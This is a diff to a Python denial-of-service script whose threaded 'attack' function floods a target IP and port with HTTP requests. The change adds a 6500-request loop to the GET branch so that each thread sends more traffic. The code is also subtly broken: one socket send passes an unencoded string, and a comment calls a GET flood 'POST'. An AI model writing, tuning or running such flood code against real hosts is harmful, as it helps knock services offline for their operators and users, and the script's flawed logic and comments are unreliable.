@@ -96,11 +96,12 @@ def attack(ip, port, threadNum):
     while True:
         try:
             if method == "GET":
-                urlsocket_file = urllib.request.urlopen(request)
-                print("[*] Thread (%s) | Attack Sent!" % (threadNum))
+                for _ in range(6500):  # Adjusted the loop to send 6500 requests in GET method
+                    urlsocket_file = urllib.request.urlopen(request)
+                    print("[*] Thread (%s) | Attack Sent!" % (threadNum))
             else:
                 s.connect((ip, port))
-                for _ in range(6500):  # Adjusted the loop to send 6500 requests
+                for _ in range(6500):  # Adjusted the loop to send 6500 requests in POST method
                     s.send(("GET /%s HTTP/1.1\r\n" % (url)).encode('utf-8'))
                     s.send("Host: %s\r\n\r\n" % (url))
                 s.close()
